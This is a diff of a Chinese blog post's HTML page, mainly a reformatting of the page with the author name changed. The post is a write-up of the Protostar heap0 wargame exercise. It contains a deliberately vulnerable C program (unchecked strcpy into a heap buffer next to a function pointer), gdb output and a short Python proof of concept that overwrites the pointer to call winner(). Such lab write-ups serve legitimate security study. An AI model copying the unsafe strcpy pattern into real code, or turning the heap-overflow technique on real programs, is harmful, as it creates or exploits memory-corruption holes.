@@ -21,7 +21,11 @@
  学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。
 
 0x01 C语言源代码C代码
-12345678910111213141516171819202122232425262728293031323334353637383940#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#inclu">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Protostar-堆溢出学习-覆盖堆函数指针劫持代码流">
 <meta property="og:url" content="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/index.html">
@@ -30,7 +34,11 @@
  学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。
 
 0x01 C语言源代码C代码
-12345678910111213141516171819202122232425262728293031323334353637383940#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#inclu">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true">
 <meta property="og:updated_time" content="2017-05-02T14:34:15.000Z">
@@ -40,7 +48,11 @@
  学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。
 
 0x01 C语言源代码C代码
-12345678910111213141516171819202122232425262728293031323334353637383940#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#inclu">
 <meta name="twitter:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true">
   
     <link rel="alternate" href="/atom.xml" title="4ch12dy" type="application/atom+xml">
@@ -48,8 +60,6 @@
   
     <link rel="icon" href="/favicon.png">
   
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
   <link rel="stylesheet" href="../../../../../css/common.css">
 <link rel="stylesheet" href="../../../../../css/nav.css">
@@ -64,7 +74,7 @@
     <nav class="nav">
          <div class="nav-left">
             <a href="/" class="nav-item" style="font-size: 20px;">
-              <span class="logo">Diskobólos</span>'s Blog
+              <span class="logo">xia0</span>'s Blog
             </a>
          </div>
         <div class="nav-center is-hidden position-relative" id="search_container">
@@ -88,7 +98,7 @@
                 My Works
             </a>
             
-            <a class="nav-item" href="../../../../../about">
+            <a class="nav-item" href="../../../../../aboutme">
                 About
             </a>
             
@@ -108,7 +118,7 @@
                 My Works
             </a>
             
-            <a class="nav-item flex-1" href="../../../../../about">
+            <a class="nav-item flex-1" href="../../../../../aboutme">
                 About
             </a>
             
@@ -164,7 +174,7 @@
             
             <div class="is-flex align-center">
                 <img class="post-avatar" src="https://cdn2.iconfinder.com/data/icons/rcons-user/32/male-shadow-circle-512.png">
-                <span style="padding:0 10px;"> <span class="sub-title">By</span> Diskobólos</span>
+                <span style="padding:0 10px;"> <span class="sub-title">By</span> xia0</span>
                 <span class="post-date sub-title">at: 2017-04-18</span>
             </div>
             
@@ -184,8 +194,47 @@
 <p> 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p>
 </blockquote>
 <h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><p><code>C代码</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line"></div><div class="line">struct data &#123;</div><div class="line">  char name[64];</div><div class="line">&#125;;</div><div class="line"></div><div class="line">struct fp &#123;</div><div class="line">  int (*fp)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line">void winner()</div><div class="line">&#123;</div><div class="line">  printf(&quot;level passed\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void nowinner()</div><div class="line">&#123;</div><div class="line">  printf(&quot;level has not been passed\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  struct data *d;</div><div class="line">  struct fp *f;</div><div class="line"></div><div class="line">  d = malloc(sizeof(struct data));</div><div class="line">  f = malloc(sizeof(struct fp));</div><div class="line">  f-&gt;fp = nowinner;</div><div class="line"></div><div class="line">  printf(&quot;data is at %p, fp is at %p\n&quot;, d, f);</div><div class="line"></div><div class="line">  strcpy(d-&gt;name, argv[1]);</div><div class="line">  </div><div class="line">  f-&gt;fp();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+
+struct data {
+  char name[64];
+};
+
+struct fp {
+  int (*fp)();
+};
+
+void winner()
+{
+  printf(&quot;level passed\n&quot;);
+}
+
+void nowinner()
+{
+  printf(&quot;level has not been passed\n&quot;);
+}
+
+int main(int argc, char **argv)
+{
+  struct data *d;
+  struct fp *f;
+
+  d = malloc(sizeof(struct data));
+  f = malloc(sizeof(struct fp));
+  f-&gt;fp = nowinner;
+
+  printf(&quot;data is at %p, fp is at %p\n&quot;, d, f);
+
+  strcpy(d-&gt;name, argv[1]);
+
+  f-&gt;fp();
+
+}
+</code></pre><h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p>
 <p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p>
 <p>由于<code>strcpy</code>没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为<code>winner</code>函数？Here we go！</p>
 <h2 id="0x03-malloc"><a href="#0x03-malloc" class="headerlink" title="0x03 malloc()"></a>0x03 malloc()</h2><p>在继续分析之前，我们先来简单的介绍一下<code>malloc</code>函数，在这里<code>malloc</code>函数更多是对<code>mmap</code>系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用<code>mmap</code>来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。</p>
@@ -231,10 +280,16 @@
 <h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p>
 <p>1.利用gdb查看strcpy前后堆的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p>
 <p>2.查看<code>winner</code>地址，重写fp函数指针</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p winner </div><div class="line">$1 = &#123;void (void)&#125; 0x8048464 &lt;winner&gt;</div></pre></td></tr></table></figure>
-<p>3.PoC Python脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import struct</div><div class="line">padding = &quot;A&quot;*64 #填充data</div><div class="line">head = &quot;BBBB&quot;  # not care</div><div class="line">head += &quot;CCCC&quot; # not care</div><div class="line">winner = struct.pack(&quot;I&quot;, 0x8048464) #将nowinner地址改为winner地址</div><div class="line">print padding+head+winner</div></pre></td></tr></table></figure>
-<p>4.hack<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true" alt="0-1"><br>成功执行<code>winner</code>函数!</p>
+<pre><code>(gdb) p winner 
+$1 = {void (void)} 0x8048464 &lt;winner&gt;
+</code></pre><p>3.PoC Python脚本</p>
+<pre><code>import struct
+padding = &quot;A&quot;*64 #填充data
+head = &quot;BBBB&quot;  # not care
+head += &quot;CCCC&quot; # not care
+winner = struct.pack(&quot;I&quot;, 0x8048464) #将nowinner地址改为winner地址
+print padding+head+winner
+</code></pre><p>4.hack<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true" alt="0-1"><br>成功执行<code>winner</code>函数!</p>
 
         </div>
         <div class="post-reply">
